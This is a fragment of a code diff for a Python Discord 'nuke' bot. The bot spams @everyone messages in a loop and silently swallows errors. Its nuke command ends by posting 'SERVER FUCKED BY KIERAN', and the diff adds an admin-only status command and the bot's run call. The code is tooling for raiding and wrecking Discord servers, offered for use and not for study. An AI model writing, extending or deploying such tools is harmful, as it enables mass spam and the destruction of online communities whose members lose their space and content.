@@ -51,7 +51,7 @@ async def spam_task(channel, text, count=80):
         try:
             await channel.send(f"@everyone {text}")
         except:
-            pass  # Fail silently and keep going
+            pass
 
 @bot.command()
 @commands.has_permissions(administrator=True)
@@ -142,4 +142,12 @@ async def nuke(ctx):
     
     await spam(ctx)
     await ctx.send("@everyone **SERVER FUCKED BY KIERAN**")
-    logging.info("ULTRA
+    logging.info("ULTRA FAST NUKE COMPLETE")
+
+@bot.command()
+@commands.has_permissions(administrator=True)
+async def status(ctx):
+    await ctx.message.delete()
+    await ctx.send(f"**Kieran Fast Nuke Bot Active**\nGuild: {ctx.guild.name}\nMembers: {len(ctx.guild.members)}")
+
+bot.run(TOKEN)
